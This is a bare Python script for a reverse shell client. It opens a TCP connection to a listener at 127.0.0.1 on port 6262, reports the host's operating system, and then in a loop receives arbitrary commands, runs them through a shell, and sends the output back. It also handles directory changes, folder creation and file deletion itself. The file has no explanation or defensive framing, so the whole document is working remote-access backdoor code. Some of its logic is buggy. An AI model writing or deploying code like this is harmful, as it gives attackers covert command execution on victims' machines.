from socket import *
import os, platform, subprocess, sys

ip = "127.0.0.1"
port = 6262
platf = platform.system().encode()

s = socket(AF_INET, SOCK_STREAM)
s.connect((ip, port))
s.send(platf)

while True:
    comm = s.recv(1024).decode()
    try:
        comm_execute = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except:
        s.send("ERROR")
    
    sdc = f"command: '{comm}' not found"
    if comm == "stop":
        sys.exit(0)
    
        
    if comm.startswith("cd "):
    
        comm = comm.replace("cd ", "")
        try:
            os.chdir(comm)
        except:
            sdc = f"cd: directory '{comm}' not found"
            
        sdc = comm
    elif comm.startswith("mkdir "):
    
        comm = comm.replace("mkdir ", "")
        
        try:
            os.mkdir(comm)
        except:
            sdc = f"mkdir: cannot create directory ‘{comm}’: File exists"

        sdc = f"mkdir: directory '{comm}' create"
    elif comm.startswith("rm -r "):

        comm = comm.replace("rm -r ", "")

        try:
            os.remove(comm)
        except OSError as er:
            sdc = f"rm: {er}"

        sdc = f"rm: remove directory {comm}"
    elif comm.startswith("del "):
        comm = comm.replace("del ", "")
        try:
            os.remove(comm)
        except OSError as er:
            sdc = f"rm: {er}"

        sdc = f"rm: remove directory {comm}"
    elif comm.startswith("rm "):
        sdc = "rm: need 1 argument '-r'"
    else:
        try:
            sdc = comm_execute.stdout.read().decode()
        except:
            sdc = ""

    if comm_execute.stdout.read().decode() != "":
        sdc = "system: error unknown"
        
    s.send(sdc.encode())
